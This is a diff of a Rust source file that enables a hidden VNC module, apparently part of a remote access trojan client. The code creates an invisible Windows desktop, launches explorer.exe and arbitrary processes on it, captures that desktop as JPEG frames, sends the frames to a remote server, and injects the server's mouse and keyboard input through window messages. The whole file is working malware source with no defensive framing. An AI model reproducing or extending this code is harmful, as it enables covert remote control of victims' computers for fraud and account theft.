@@ -1,509 +1,336 @@
-// use std::sync::atomic::{AtomicBool, Ordering};
-// use std::sync::Arc;
-// use std::thread;
-// use std::time::Duration;
-// use std::sync::Mutex;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+use std::thread;
+use std::time::Duration;
+use std::sync::Mutex;
+use std::io::Cursor;
+use std::ffi::CString;
+use std::ptr::null_mut;
+use std::mem::zeroed;
 
-// use screenshots::image;
-// use std::io::Cursor;
+use winapi::um::winuser::*;
+use winapi::um::wingdi::*;
+use winapi::shared::windef::*;
+use winapi::shared::minwindef::*;
+use winapi::um::processthreadsapi::*;
+use winapi::um::winnt::GENERIC_ALL;
+use winapi::um::handleapi::CloseHandle;
+use winapi::um::tlhelp32::*;
 
-// use common::packets::ServerboundPacket;
-// use crate::handler::send_packet;
+use common::packets::{ServerboundPacket, HVNCFrame, HVNCConfig, MouseClickData, KeyboardInputData};
+use crate::handler::send_packet;
 
-// use winapi::um::winuser::{
-//     CreateDesktopA,
-//     OpenDesktopA,
-//     CloseDesktop,
-//     SetThreadDesktop,
-//     GetDesktopWindow,
-//     GetDC,
-//     ReleaseDC,
-//     GetWindowRect,
-//     PrintWindow,
-//     GetTopWindow,
-//     GetWindow,
-//     IsWindowVisible,
-//     GW_HWNDLAST,
-//     GW_HWNDPREV,
-//     DESKTOP_CREATEWINDOW,
-//     DESKTOP_WRITEOBJECTS,
-//     DESKTOP_READOBJECTS,
-//     DESKTOP_SWITCHDESKTOP,
-//     DESKTOP_ENUMERATE,
-//     EnumDesktopWindows,
-//     GetWindowThreadProcessId
-// };
-// use winapi::um::wingdi::{
-//     CreateCompatibleDC,
-//     CreateCompatibleBitmap,
-//     SelectObject,
-//     DeleteObject,
-//     DeleteDC,
-//     GetDeviceCaps,
-//     GetDIBits,
-//     BITMAPINFO, 
-//     BITMAPINFOHEADER, 
-//     BI_RGB, 
-//     DIB_RGB_COLORS,
-//     HORZRES,
-//     VERTRES
-// };
-// use winapi::shared::windef::{HWND, HDC, RECT, HBITMAP, HGDIOBJ};
-// use winapi::shared::minwindef::{BOOL, DWORD, TRUE, FALSE};
-// use std::ffi::CString;
-// use std::mem::zeroed;
-// use std::ptr::null_mut;
-// use winapi::um::processthreadsapi::{STARTUPINFOA, CreateProcessA, PROCESS_INFORMATION};
-// use winapi::um::winnt::GENERIC_ALL;
+use tokio::sync::mpsc;
+use once_cell::sync::Lazy;
 
-// static ACCESS_FLAGS: DWORD = DESKTOP_CREATEWINDOW | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP |DESKTOP_ENUMERATE | GENERIC_ALL;
+static ACCESS_FLAGS: DWORD = DESKTOP_CREATEWINDOW | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP | DESKTOP_ENUMERATE | GENERIC_ALL;
 
-// static HVNC_ACTIVE: Mutex<Option<Arc<AtomicBool>>> = Mutex::new(None);
-// static DESKTOP_NAME: Mutex<&str> = Mutex::new("Desktopx2");
+static HVNC_ACTIVE: Mutex<Option<Arc<AtomicBool>>> = Mutex::new(None);
+static DESKTOP_NAME: Mutex<String> = Mutex::new(String::new());
 
-// pub fn start_hvnc() {
-//     stop_hvnc();
+enum HVNCInput {
+    Mouse(MouseClickData),
+    Keyboard(KeyboardInputData),
+    StartProcess(String),
+}
 
-//     let stop_flag = Arc::new(AtomicBool::new(false));
+static INPUT_TX: Lazy<Mutex<Option<mpsc::UnboundedSender<HVNCInput>>>> = Lazy::new(|| Mutex::new(None));
+
+pub fn start_hvnc(config: HVNCConfig) {
+    stop_hvnc();
+
+    let stop_flag = Arc::new(AtomicBool::new(false));
+    *HVNC_ACTIVE.lock().unwrap() = Some(Arc::clone(&stop_flag));
     
-//     let mut active = HVNC_ACTIVE.lock().unwrap();
-//     *active = Some(Arc::clone(&stop_flag));
+    let desktop_name = format!("HVNC_{}", rand::random::<u32>());
+    *DESKTOP_NAME.lock().unwrap() = desktop_name.clone();
+
+    let (tx, mut rx) = mpsc::unbounded_channel::<HVNCInput>();
+    *INPUT_TX.lock().unwrap() = Some(tx);
     
-//     let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
-    
-//     thread::spawn(move || {
-//         let rt = tokio::runtime::Builder::new_current_thread()
-//             .enable_all()
-//             .build()
-//             .expect("Failed to create Tokio runtime");
+    thread::spawn(move || {
+        let rt = tokio::runtime::Builder::new_current_thread()
+            .enable_all()
+            .build()
+            .expect("Failed to create Tokio runtime");
             
-//         let stop_flag = HVNC_ACTIVE.lock().unwrap().as_ref().unwrap().clone();
+        let desktop_name_cstr = CString::new(desktop_name.clone()).unwrap();
         
-//         let hvnc_desktop = unsafe {
-//             // Convert desktop name to CString for the API call
-//             let desktop_name_cstr = match CString::new(desktop_name) {
-//                 Ok(cstr) => cstr,
-//                 Err(_) => {
-//                     return;
-//                 }
-//             };
-            
-//             // Try to open existing desktop first
-//             let desktop_handle = OpenDesktopA(
-//                 desktop_name_cstr.as_ptr() as *const i8,
-//                 0,
-//                 FALSE,
-//                 ACCESS_FLAGS
-//             );
-            
-//             // If it doesn't exist, create a new one
-//             let desktop_handle = if desktop_handle.is_null() {
-//                 let new_handle = CreateDesktopA(
-//                     desktop_name_cstr.as_ptr() as *const i8,
-//                     null_mut(),
-//                     null_mut(),
-//                     0,
-//                     ACCESS_FLAGS,
-//                     null_mut()
-//                 );
-                
-//                 new_handle
-//             } else {
-//                 desktop_handle
-//             };
-            
-//             desktop_handle
-//         };
+        let hvnc_desktop = unsafe {
+            let h = CreateDesktopA(
+                desktop_name_cstr.as_ptr(),
+                null_mut(),
+                null_mut(),
+                0,
+                ACCESS_FLAGS,
+                null_mut()
+            );
+            if h.is_null() {
+                OpenDesktopA(desktop_name_cstr.as_ptr(), 0, FALSE, ACCESS_FLAGS)
+            } else {
+                h
+            }
+        };
         
-//         if hvnc_desktop.is_null() {
-//             return;
-//         }
+        if hvnc_desktop.is_null() {
+            return;
+        }
         
-//         let desktop_set = unsafe {
-//             SetThreadDesktop(hvnc_desktop) != 0
-//         };
-        
-//         if !desktop_set {
-//             unsafe { CloseDesktop(hvnc_desktop) };
-//             return;
-//         }
-        
-        
-//         // Stream frames as long as active
-//         while !stop_flag.load(Ordering::Relaxed) {
-//             // Get desktop dimensions
-//             let (width, height) = unsafe {
-//                 let dc = GetDC(null_mut());
-//                 let w = GetDeviceCaps(dc, HORZRES);
-//                 let h = GetDeviceCaps(dc, VERTRES);
-//                 ReleaseDC(null_mut(), dc);
-//                 (w, h)
-//             };
-            
-//             let mut frame_data = Vec::new();
-            
-//             unsafe {
-//                 // Capture desktop image
-//                 let dc = GetDC(null_mut());
-//                 if !dc.is_null() {
-//                     let mem_dc = CreateCompatibleDC(dc);
-//                     if !mem_dc.is_null() {
-//                         let bitmap = CreateCompatibleBitmap(dc, width, height);
-//                         if !bitmap.is_null() {
-//                             let old_obj = SelectObject(mem_dc, bitmap as HGDIOBJ);
-                            
-//                             // Capture visible windows
-//                             let _ = capture_windows(mem_dc);
-                            
-//                             // Convert to image and compress
-//                             let raw_data = extract_bitmap_data(bitmap, width, height);
-                            
-//                             if let Some(img) = image::RgbaImage::from_raw(
-//                                 width as u32, 
-//                                 height as u32, 
-//                                 raw_data
-//                             ) {
-//                                 let dynamic_img = image::DynamicImage::ImageRgba8(img);
-                                
-//                                 // Compress to JPEG and send
-//                                 if dynamic_img.write_to(
-//                                     &mut Cursor::new(&mut frame_data),
-//                                     image::ImageOutputFormat::Jpeg(70), // 70% quality
-//                                 ).is_ok() {
-//                                     // Only send if we have data
-//                                     if !frame_data.is_empty() {
-//                                         // Send frame
-//                                         let packet = ServerboundPacket::HVNCFrame(frame_data);
-                                        
-//                                         if let Err(_e) = rt.block_on(send_packet(packet)) {
-//                                         }
-//                                     }
-//                                 }
-//                             }
-                            
-//                             // Clean up
-//                             SelectObject(mem_dc, old_obj);
-//                             DeleteObject(bitmap as HGDIOBJ);
-//                         }
-//                         DeleteDC(mem_dc);
-//                     }
-//                     ReleaseDC(null_mut(), dc);
-//                 }
-//             }
-            
-//             // Sleep to control frame rate (about 5 FPS)
-//             thread::sleep(Duration::from_millis(200));
-//         }
-        
-//         // Cleanup desktop
-//         unsafe {
-//             if !hvnc_desktop.is_null() {
-//                 CloseDesktop(hvnc_desktop);
-//             }
-//         }
-//     });
-// }
+        unsafe {
+            SetThreadDesktop(hvnc_desktop);
+        }
 
-// pub fn stop_hvnc() {
-//     // Set the stop flag to stop the streaming thread
-//     let mut active = HVNC_ACTIVE.lock().unwrap();
-//     if let Some(flag) = active.as_ref() {
-//         flag.store(true, Ordering::Relaxed);
-//         *active = None;
-//     }
-    
-//     // Get the desktop name
-//     let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
-    
-//     // Spawn a thread to properly clean up the desktop
-//     thread::spawn(move || {
-//         // Give a moment for the streaming thread to stop
-//         thread::sleep(Duration::from_millis(500));
+        // Start explorer on the new desktop
+        open_process_internal(&desktop_name, "explorer.exe");
         
-//         unsafe {
-//             // Find all processes on the HVNC desktop and terminate them
-//             kill_all_processes_on_desktop(&desktop_name);
-            
-//             // Try to open the desktop to close it
-//             if let Ok(desktop_cstr) = CString::new(desktop_name) {
-//                 let desktop_handle = OpenDesktopA(
-//                     desktop_cstr.as_ptr() as *const i8,
-//                     0,
-//                     FALSE,
-//                     DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
-//                 );
-                
-//                 if !desktop_handle.is_null() {
-//                     CloseDesktop(desktop_handle);
-//                 }
-//             }
-            
-//             // Attempt to close/switch from the desktop to ensure it's not in use
-//             if let Ok(workstation_name) = CString::new("WinSta0\\Default") {
-//                 let default_desktop = OpenDesktopA(
-//                     workstation_name.as_ptr() as *const i8, 
-//                     0, 
-//                     FALSE, 
-//                     DESKTOP_SWITCHDESKTOP
-//                 );
-                
-//                 if !default_desktop.is_null() {
-//                     // Switch to default desktop to ensure resources are freed
-//                     SetThreadDesktop(default_desktop);
-//                     CloseDesktop(default_desktop);
-//                 }
-//             }
-//         }
-//     });
-// }
+        let frame_delay = Duration::from_millis(1000 / config.fps.max(1) as u64);
+        let stop_flag_clone = Arc::clone(&stop_flag);
+        let desktop_name_clone = desktop_name.clone();
 
-// unsafe fn kill_all_processes_on_desktop(desktop_name: &str) {
-//     use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
-//     use winapi::um::handleapi::CloseHandle;
-//     use winapi::um::winnt::PROCESS_TERMINATE;
-//     use winapi::shared::minwindef::DWORD;
-    
-//     #[allow(non_snake_case)]
-//     extern "system" {
-//         fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE;
-//         fn Process32FirstW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
-//         fn Process32NextW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
-//     }
-    
-//     type HANDLE = *mut winapi::ctypes::c_void;
-    
-//     #[repr(C)]
-//     struct PROCESSENTRY32W {
-//         dwSize: DWORD,
-//         cntUsage: DWORD,
-//         th32ProcessID: DWORD,
-//         th32DefaultHeapID: usize,
-//         th32ModuleID: DWORD,
-//         cntThreads: DWORD,
-//         th32ParentProcessID: DWORD,
-//         pcPriClassBase: i32,
-//         dwFlags: DWORD,
-//         szExeFile: [u16; 260],
-//     }
-    
-//     const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
+        // Input handling loop on the desktop thread
+        thread::spawn(move || {
+            unsafe {
+                let d_cstr = CString::new(desktop_name_clone).unwrap();
+                let h_d = OpenDesktopA(d_cstr.as_ptr(), 0, FALSE, ACCESS_FLAGS);
+                if h_d.is_null() { return; }
+                SetThreadDesktop(h_d);
+
+                while !stop_flag_clone.load(Ordering::Relaxed) {
+                    if let Ok(input) = rx.try_recv() {
+                        match input {
+                            HVNCInput::Mouse(data) => {
+                                let hwnd = WindowFromPoint(POINT { x: data.x, y: data.y });
+                                if !hwnd.is_null() {
+                                    let mut screen_point = POINT { x: data.x, y: data.y };
+                                    ScreenToClient(hwnd, &mut screen_point);
+                                    let lparam = ((screen_point.y as u32) << 16) | (screen_point.x as u32 & 0xFFFF);
+                                    match (data.click_type, data.action_type) {
+                                        (0, 1) => { PostMessageA(hwnd, WM_LBUTTONDOWN, MK_LBUTTON as usize, lparam as isize); },
+                                        (0, 2) => { PostMessageA(hwnd, WM_LBUTTONUP, 0, lparam as isize); },
+                                        (2, 1) => { PostMessageA(hwnd, WM_RBUTTONDOWN, MK_RBUTTON as usize, lparam as isize); },
+                                        (2, 2) => { PostMessageA(hwnd, WM_RBUTTONUP, 0, lparam as isize); },
+                                        (_, 3) => { PostMessageA(hwnd, WM_MOUSEMOVE, 0, lparam as isize); },
+                                        _ => {}
+                                    }
+                                }
+                            },
+                            HVNCInput::Keyboard(data) => {
+                                let hwnd = GetForegroundWindow();
+                                if !hwnd.is_null() {
+                                    let msg = if data.is_keydown { WM_KEYDOWN } else { WM_KEYUP };
+                                    PostMessageA(hwnd, msg, data.key_code as usize, 0);
+                                    if data.is_keydown && !data.character.is_empty() {
+                                        for c in data.character.chars() {
+                                            PostMessageA(hwnd, WM_CHAR, c as usize, 0);
+                                        }
+                                    }
+                                }
+                            },
+                            HVNCInput::StartProcess(path) => {
+                                open_process_internal(&desktop_name_clone, &path);
+                            }
+                        }
+                    }
+                    thread::sleep(Duration::from_millis(10));
+                }
+                CloseDesktop(h_d);
+            }
+        });
+
+        while !stop_flag.load(Ordering::Relaxed) {
+            let start_time = std::time::Instant::now();
+            
+            if let Some(frame) = capture_hvnc_desktop(hvnc_desktop, config.quality) {
+                let packet = ServerboundPacket::HVNCFrame(frame);
+                let _ = rt.block_on(send_packet(packet));
+            }
+            
+            let elapsed = start_time.elapsed();
+            if elapsed < frame_delay {
+                thread::sleep(frame_delay - elapsed);
+            }
+        }
         
-//     let mut hvnc_desktop_pids: Vec<DWORD> = Vec::new();
-    
-//     if let Ok(desktop_cstr) = CString::new(desktop_name) {
-//         let desktop_handle = OpenDesktopA(
-//             desktop_cstr.as_ptr() as *const i8,
-//             0,
-//             FALSE,
-//             DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
-//         );
+        unsafe {
+            kill_all_processes_on_desktop(&desktop_name);
+            CloseDesktop(hvnc_desktop);
+        }
+    });
+}
+
+pub fn stop_hvnc() {
+    if let Some(flag) = HVNC_ACTIVE.lock().unwrap().take() {
+        flag.store(true, Ordering::Relaxed);
+    }
+    *INPUT_TX.lock().unwrap() = None;
+}
+
+pub fn hvnc_start_process(process_path: String) {
+    if let Some(tx) = INPUT_TX.lock().unwrap().as_ref() {
+        let _ = tx.send(HVNCInput::StartProcess(process_path));
+    }
+}
+
+fn open_process_internal(desktop_name: &str, process_path: &str) {
+    unsafe {
+        let mut si: STARTUPINFOA = zeroed();
+        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
+        let desktop_cstr = CString::new(format!("WinSta0\\{}", desktop_name)).unwrap();
+        si.lpDesktop = desktop_cstr.as_ptr() as *mut i8;
         
-//         if !desktop_handle.is_null() {
-//             extern "system" fn enum_windows_callback(hwnd: HWND, lparam: isize) -> BOOL {
-//                 unsafe {
-//                     let pid_vec = &mut *(lparam as *mut Vec<DWORD>);
-//                     let mut process_id: DWORD = 0;
-                    
-//                     GetWindowThreadProcessId(hwnd, &mut process_id);
-                    
-//                     if process_id != 0 && !pid_vec.contains(&process_id) {
-//                         pid_vec.push(process_id);
-//                     }
-//                 }
-//                 TRUE
-//             }
-            
-//             let _result = EnumDesktopWindows(
-//                 desktop_handle,
-//                 Some(enum_windows_callback),
-//                 &mut hvnc_desktop_pids as *mut Vec<DWORD> as isize
-//             );
-            
-//             CloseDesktop(desktop_handle);
-//         }
-//     }
+        let mut pi: PROCESS_INFORMATION = zeroed();
+        let cmd = CString::new(process_path).unwrap();
+        let mut cmd_vec: Vec<i8> = cmd.as_bytes_with_nul().iter().map(|&b| b as i8).collect();
+
+        CreateProcessA(
+            null_mut(),
+            cmd_vec.as_mut_ptr(),
+            null_mut(),
+            null_mut(),
+            FALSE,
+            0,
+            null_mut(),
+            null_mut(),
+            &mut si,
+            &mut pi
+        );
         
-//     if hvnc_desktop_pids.is_empty() {
-//         return;
-//     }
-    
-//     let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-//     if snapshot.is_null() {
-//         return;
-//     }
-    
-//     let mut pe32: PROCESSENTRY32W = std::mem::zeroed();
-//     pe32.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
-    
-//     if Process32FirstW(snapshot, &mut pe32) != 0 {
-//         loop {
-//             let name = String::from_utf16_lossy(
-//                 &pe32.szExeFile[..pe32.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe32.szExeFile.len())]
-//             );
-            
-//             if name.to_lowercase().contains("explorer") || name.to_lowercase().contains("cmd") {
-//                 if hvnc_desktop_pids.contains(&pe32.th32ProcessID) {
-//                     if pe32.th32ProcessID != winapi::um::processthreadsapi::GetCurrentProcessId() {
-//                         let process = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
-//                         if !process.is_null() {
-//                             TerminateProcess(process, 0);
-//                             CloseHandle(process);
-//                         }
-//                     }
-//                 }
-//             }
-            
-//             if Process32NextW(snapshot, &mut pe32) == 0 {
-//                 break;
-//             }
-//         }
-//     }
-    
-//     CloseHandle(snapshot);
-// }
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
 
-// pub fn open_process(process_name: &str) {
-//     let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
-//     let process_name = process_name.to_string();
-    
-//     thread::spawn(move || {
-//         unsafe {
-//             let desktop_cstr = match CString::new(desktop_name) {
-//                 Ok(cstr) => cstr,
-//                 Err(_) => {
-//                     return;
-//                 }
-//             };
-            
-//             let hvnc_desktop = OpenDesktopA(
-//                 desktop_cstr.as_ptr() as *const i8,
-//                 0,
-//                 FALSE,
-//                 ACCESS_FLAGS
-//             );
-            
-//             if hvnc_desktop.is_null() {
-//                 return;
-//             }
-            
-//             if SetThreadDesktop(hvnc_desktop) == 0 {
-//                 CloseDesktop(hvnc_desktop);
-//                 return;
-//             }
-            
-//             let desktop_path = format!("WinSta0\\{}", desktop_name);
-//             let desktop_path_cstr = CString::new(desktop_path.clone()).unwrap();
-            
-//             let command = CString::new(process_name).unwrap();
-            
-//             let cmd_len = command.as_bytes_with_nul().len();
-//             let mut cmd_buf = vec![0i8; cmd_len];
-//             for (i, &byte) in command.as_bytes_with_nul().iter().enumerate() {
-//                 cmd_buf[i] = byte as i8;
-//             }
-            
-//             let mut si: STARTUPINFOA = zeroed();
-//             si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-//             si.lpDesktop = desktop_path_cstr.as_ptr() as *mut i8;
-//             si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
-//             si.wShowWindow = 5;      // SW_SHOW
-            
-//             let mut pi: PROCESS_INFORMATION = zeroed();
-            
-//             let result = CreateProcessA(
-//                 null_mut(),              // No application name (use command line)
-//                 cmd_buf.as_mut_ptr(),    // Command line
-//                 null_mut(),              // Process security attributes
-//                 null_mut(),              // Thread security attributes
-//                 FALSE,                   // Don't inherit handles
-//                 0x00000010,              // CREATE_NEW_CONSOLE
-//                 null_mut(),              // Use parent's environment
-//                 null_mut(),              // Use parent's current directory
-//                 &mut si,                 // Startup info with desktop name
-//                 &mut pi                  // Process information
-//             );
-            
-//             if result != 0 {
-//                 winapi::um::handleapi::CloseHandle(pi.hProcess);
-//                 winapi::um::handleapi::CloseHandle(pi.hThread);
-//             }
-            
-//             CloseDesktop(hvnc_desktop);
-//         }
-//     });
-// }
-
-// unsafe fn capture_windows(mem_dc: HDC) -> bool {
-//     let desktop_wnd = GetDesktopWindow();
-//     if desktop_wnd.is_null() {
-//         return false;
-//     }
-    
-//     let mut desktop_rect: RECT = zeroed();
-//     if GetWindowRect(desktop_wnd, &mut desktop_rect) == 0 {
-//         return false;
-//     }
-    
-//     let mut hwnd = GetTopWindow(null_mut());
-//     if hwnd.is_null() {
-//         return false;
-//     }
-    
-//     hwnd = GetWindow(hwnd, GW_HWNDLAST);
-//     if hwnd.is_null() {
-//         return false;
-//     }
-    
-//     while !hwnd.is_null() {
-//         if IsWindowVisible(hwnd) != 0 {
-//             let mut rect: RECT = zeroed();
-//             if GetWindowRect(hwnd, &mut rect) != 0 {
-//                 PrintWindow(hwnd, mem_dc, 2);
-//             }
-//         }
+fn capture_hvnc_desktop(h_desktop: HDESK, quality: u8) -> Option<HVNCFrame> {
+    unsafe {
+        let h_old_desktop = GetThreadDesktop(GetCurrentThreadId());
+        SetThreadDesktop(h_desktop);
         
-//         hwnd = GetWindow(hwnd, GW_HWNDPREV);
-//     }
-    
-//     true
-// }
+        let h_dc_screen = GetDC(null_mut());
+        let h_dc_mem = CreateCompatibleDC(h_dc_screen);
+        
+        let width = GetDeviceCaps(h_dc_screen, HORZRES);
+        let height = GetDeviceCaps(h_dc_screen, VERTRES);
 
-// unsafe fn extract_bitmap_data(bitmap: HBITMAP, width: i32, height: i32) -> Vec<u8> {
-//     let mut buffer = vec![0u8; (width * height * 4) as usize];
-    
-//     let dc = GetDC(null_mut());
-//     if dc.is_null() {
-//         return buffer; // Return empty buffer on failure
-//     }
+        let h_bitmap = CreateCompatibleBitmap(h_dc_screen, width, height);
+        let h_old_obj = SelectObject(h_dc_mem, h_bitmap as HGDIOBJ);
 
-//     let mut bi = BITMAPINFO {
-//         bmiHeader: BITMAPINFOHEADER {
-//             biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
-//             biWidth: width,
-//             biHeight: -height, // Negative for top-down
-//             biPlanes: 1,
-//             biBitCount: 32,    // 32-bit RGBA
-//             biCompression: BI_RGB,
-//             biSizeImage: 0,
-//             biXPelsPerMeter: 0,
-//             biYPelsPerMeter: 0,
-//             biClrUsed: 0,
-//             biClrImportant: 0,
-//         },
-//         bmiColors: [std::mem::zeroed()],
-//     };
-    
-//     let _result = GetDIBits(
-//         dc, 
-//         bitmap, 
-//         0, 
-//         height as u32, 
-//         buffer.as_mut_ptr() as *mut winapi::ctypes::c_void, 
-//         &mut bi, 
-//         DIB_RGB_COLORS
-//     );
-    
-//     ReleaseDC(null_mut(), dc);
+        // Fill background with black
+        let brush = CreateSolidBrush(0);
+        let rect = RECT { left: 0, top: 0, right: width, bottom: height };
+        FillRect(h_dc_mem, &rect, brush);
+        DeleteObject(brush as HGDIOBJ);
 
-//     buffer
-// }
+        unsafe extern "system" fn enum_windows_proc(hwnd: HWND, lparam: LPARAM) -> BOOL {
+            if IsWindowVisible(hwnd) != 0 {
+                let h_dc_mem = lparam as HDC;
+                // PW_RENDERFULLCONTENT = 2
+                PrintWindow(hwnd, h_dc_mem, 2);
+            }
+            TRUE
+        }
+
+        EnumDesktopWindows(h_desktop, Some(enum_windows_proc), h_dc_mem as LPARAM);
+        
+        let mut bmi = BITMAPINFO {
+            bmiHeader: BITMAPINFOHEADER {
+                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
+                biWidth: width,
+                biHeight: -height,
+                biPlanes: 1,
+                biBitCount: 24,
+                biCompression: BI_RGB,
+                biSizeImage: 0,
+                biXPelsPerMeter: 0,
+                biYPelsPerMeter: 0,
+                biClrUsed: 0,
+                biClrImportant: 0,
+            },
+            bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }; 1],
+        };
+
+        let row_stride = ((width * 24 + 31) / 32) * 4;
+        let mut buffer = vec![0u8; (row_stride * height) as usize];
+        GetDIBits(
+            h_dc_mem,
+            h_bitmap,
+            0,
+            height as u32,
+            buffer.as_mut_ptr() as *mut _,
+            &mut bmi,
+            DIB_RGB_COLORS,
+        );
+
+        SelectObject(h_dc_mem, h_old_obj);
+        DeleteObject(h_bitmap as HGDIOBJ);
+        DeleteDC(h_dc_mem);
+        ReleaseDC(null_mut(), h_dc_screen);
+
+        SetThreadDesktop(h_old_desktop);
+
+        // Convert BGR to RGB, handling stride
+        let mut rgb_data = Vec::with_capacity((width * height * 3) as usize);
+        for y in 0..height {
+            let row_start = (y * row_stride) as usize;
+            for x in 0..width {
+                let pixel_start = row_start + (x * 3) as usize;
+                rgb_data.push(buffer[pixel_start + 2]);
+                rgb_data.push(buffer[pixel_start + 1]);
+                rgb_data.push(buffer[pixel_start]);
+            }
+        }
+
+        let img = image::RgbImage::from_raw(width as u32, height as u32, rgb_data)?;
+        let mut jpeg_bytes = Cursor::new(Vec::new());
+        img.write_to(&mut jpeg_bytes, image::ImageOutputFormat::Jpeg(quality)).ok()?;
+
+        Some(HVNCFrame {
+            data: jpeg_bytes.into_inner(),
+            width: width as u32,
+            height: height as u32,
+        })
+    }
+}
+
+pub fn hvnc_mouse_click(data: MouseClickData) {
+    if let Some(tx) = INPUT_TX.lock().unwrap().as_ref() {
+        let _ = tx.send(HVNCInput::Mouse(data));
+    }
+}
+
+pub fn hvnc_keyboard_input(data: KeyboardInputData) {
+    if let Some(tx) = INPUT_TX.lock().unwrap().as_ref() {
+        let _ = tx.send(HVNCInput::Keyboard(data));
+    }
+}
+
+unsafe fn kill_all_processes_on_desktop(desktop_name: &str) {
+    let desktop_cstr = CString::new(desktop_name).unwrap();
+    let h_desktop = OpenDesktopA(desktop_cstr.as_ptr(), 0, FALSE, DESKTOP_ENUMERATE);
+    if h_desktop.is_null() { return; }
+
+    let mut pids: Vec<DWORD> = Vec::new();
+
+    unsafe extern "system" fn enum_proc(hwnd: HWND, lparam: LPARAM) -> BOOL {
+        let pids = &mut *(lparam as *mut Vec<DWORD>);
+        let mut pid: DWORD = 0;
+        GetWindowThreadProcessId(hwnd, &mut pid);
+        if pid != 0 && !pids.contains(&pid) {
+            pids.push(pid);
+        }
+        TRUE
+    }
+
+    EnumDesktopWindows(h_desktop, Some(enum_proc), &mut pids as *mut _ as LPARAM);
+
+    for pid in pids {
+        if pid != GetCurrentProcessId() {
+            let h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+            if !h_process.is_null() {
+                TerminateProcess(h_process, 0);
+                CloseHandle(h_process);
+            }
+        }
+    }
+
+    CloseDesktop(h_desktop);
+}
